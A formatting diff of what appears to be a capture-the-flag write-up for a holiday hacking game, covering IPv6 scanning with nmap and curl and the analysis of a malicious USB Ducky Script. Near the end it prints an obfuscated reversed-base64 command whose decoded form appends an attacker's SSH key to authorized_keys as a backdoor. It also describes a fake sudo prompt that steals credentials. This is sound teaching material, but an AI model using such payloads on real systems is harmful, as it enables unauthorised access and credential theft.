@@ -7,21 +7,21 @@
 Speaking with Jewel, we get the following:
 
 > Well hello! I'm Jewel Loggins.
-> 
+>
 > I have to say though, I'm a bit distressed.
-> 
+>
 > The con next door? Oh sure, I’m concerned about that too, but I was talking about the issues I’m having with IPv6.
-> 
+>
 > I mean, I know it's an old protocol now, but I've just never checked it out.
-> 
+>
 > So now I'm trying to do simple things like Nmap and cURL using IPv6, and I can't quite get them working!
-> 
+>
 > Would you mind taking a look for me on this terminal?
-> 
+>
 > I think there's a Github Gist that covers tool usage with IPv6 targets.
-> 
+>
 > The tricky parts are knowing when to use [] around IPv6 addresses and where to specify the source interface.
-> 
+>
 > I’ve got a deal for you. If you show me how to solve this terminal, I’ll provide you with some nice tips about a topic I’ve been researching a lot lately – Ducky Scripts! They can be really interesting and fun!
 
 Jumping into the terminal, we get the following prompt:
@@ -44,7 +44,8 @@ password, and enter it into the Candy Striper in the pane above. I know you
 can get it running again!
 ```
 
-Let's check to see what our ipv6 address is, and then send a multicast ping to see what other systems are on our network:
+Let's check to see what our ipv6 address is, and then send a multicast ping to see what other systems are on our
+network:
 
 ```bash
 elf@245aa314480f:~$ ip a
@@ -74,7 +75,8 @@ PING ff02::1(ff02::1) 56 data bytes
 rtt min/avg/max/mdev = 0.035/0.077/0.124/0.041 ms
 ```
 
-We can see that we are `fe80::42:c0ff:fea8:a003`, so we can rule those entries out as targets.  We can see another IP that's close to ours: `fe80::42:c0ff:fea8:a002%eth0` which makes it a good target.  Let's run an `nmap` scan:
+We can see that we are `fe80::42:c0ff:fea8:a003`, so we can rule those entries out as targets. We can see another IP
+that's close to ours: `fe80::42:c0ff:fea8:a002%eth0` which makes it a good target. Let's run an `nmap` scan:
 
 ```bash
 elf@245aa314480f:~$ nmap -6 fe80::42:c0ff:fea8:a002%eth0
@@ -111,20 +113,21 @@ PieceOnEarth
 Once complete, here's what Jewel has to say:
 
 > Great work! It seems simpler now that I've seen it once. Thanks for showing me!
-> 
+>
 > Prof. Petabyte warned us about random USB devices. They might be malicious keystroke injectors!
-> 
+>
 > A troll could program a keystroke injector to deliver malicious keystrokes when it is plugged in.
-> 
+>
 > Ducky Script is a language used to specify those keystrokes.
-> 
+>
 > What commands would a troll try to run on our workstations?
-> 
+>
 > I heard that SSH keys can be used as backdoors. Maybe that's useful?
 
 ## The Main Challenge
 
-The USB device in question can be found by heading throug the doorway at the far left of the Santa Talks floor.  Accessing the terminal gives the following prompt:
+The USB device in question can be found by heading throug the doorway at the far left of the Santa Talks floor.
+Accessing the terminal gives the following prompt:
 
 ```bash
 A random USB device, oh what could be the matter?
@@ -138,7 +141,8 @@ Evaluate the USB data in /mnt/USBDEVICE.
 elf@8cf4fe6a23da:~$
 ```
 
-Listing the contents of our directory, we see we have access to `mallard.py` which seems to be a script to help with evaluating duckscript binaries:
+Listing the contents of our directory, we see we have access to `mallard.py` which seems to be a script to help with
+evaluating duckscript binaries:
 
 ```bash
 elf@d1717fa474ab:~$ ls -l
@@ -225,11 +229,15 @@ DELAY 600
 GUI q
 ```
 
-We get what appears to be the original Ducky Script.  The script seems to be generating a fake sudo prompt, capturing the target users' sudo credentials, and sending them to a malicious site.  Towards to bottom, we see what looks like a reversed base64 encoded string that gets piped to `rev`, then `base64 -d` to decode, and finally `bash` to execute.  We can run this command in a bash terminal, minus the pipe to `bash`, to retrieve its contents:
+We get what appears to be the original Ducky Script. The script seems to be generating a fake sudo prompt, capturing the
+target users' sudo credentials, and sending them to a malicious site. Towards to bottom, we see what looks like a
+reversed base64 encoded string that gets piped to `rev`, then `base64 -d` to decode, and finally `bash` to execute. We
+can run this command in a bash terminal, minus the pipe to `bash`, to retrieve its contents:
 
 ```
 $ echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d
 echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
 ```
 
-The device adds a malicious ssh key to the authorized keys list for backdoor access to the victims system.  This key includes the answer to the challenge `ickymcgoop`. 
+The device adds a malicious ssh key to the authorized keys list for backdoor access to the victims system. This key
+includes the answer to the challenge `ickymcgoop`. 
